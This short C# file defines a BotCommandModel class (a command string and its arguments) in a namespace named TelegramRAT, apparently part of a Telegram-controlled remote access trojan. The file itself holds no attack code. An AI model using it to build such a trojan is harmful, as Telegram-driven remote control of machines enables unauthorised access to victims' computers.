using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;

namespace TelegramRAT
{
    class BotCommandModel
    {
        public string Command { get; set; }
        public string[] Args { get; set; }
        public string RawArgs { get; set; }
    }
}
